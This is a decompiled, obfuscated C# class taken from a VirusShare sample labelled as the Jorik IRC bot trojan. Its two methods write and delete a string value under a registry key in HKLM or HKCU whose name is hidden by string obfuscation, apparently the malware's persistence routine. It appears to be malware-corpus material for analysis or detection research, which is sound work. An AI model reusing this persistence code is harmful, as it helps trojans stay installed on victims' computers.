// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u007F;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace \u007F
{
  internal sealed class \u0089
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    public static bool \u000F\u0002([In] string obj0, [In] string obj1, [In] bool obj2)
    {
      bool flag;
      try
      {
        if (obj2)
        {
          RegistryKey localMachine = Registry.LocalMachine;
          RegistryKey registryKey = \u0017\u0002.\u007E\u0004\u0004((object) localMachine, \u0089.\u0001(1540), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.SetValue);
          \u0090\u0002.\u007E\u000E\u0004((object) registryKey, obj0, (object) obj1, RegistryValueKind.String);
          flag = true;
        }
        else
        {
          RegistryKey currentUser = Registry.CurrentUser;
          RegistryKey registryKey = \u0017\u0002.\u007E\u0004\u0004((object) currentUser, \u0089.\u0001(1540), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.SetValue);
          \u0090\u0002.\u007E\u000E\u0004((object) registryKey, obj0, (object) obj1, RegistryValueKind.String);
          flag = true;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    public static bool \u0010\u0002([In] string obj0, [In] bool obj1)
    {
      bool flag;
      try
      {
        if (obj1)
        {
          RegistryKey localMachine = Registry.LocalMachine;
          RegistryKey registryKey = \u0017\u0002.\u007E\u0004\u0004((object) localMachine, \u0089.\u0001(1540), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.SetValue);
          \u0082\u0003.\u007E\u0002\u0004((object) registryKey, obj0, false);
          flag = true;
        }
        else
        {
          RegistryKey currentUser = Registry.CurrentUser;
          RegistryKey registryKey = \u0017\u0002.\u007E\u0004\u0004((object) currentUser, \u0089.\u0001(1540), RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.SetValue);
          \u0082\u0003.\u007E\u0002\u0004((object) registryKey, obj0, false);
          flag = true;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0012\u0003.\u0090();
      }
      return flag;
    }

    static \u0089() => \u0004.\u008E();
  }
}
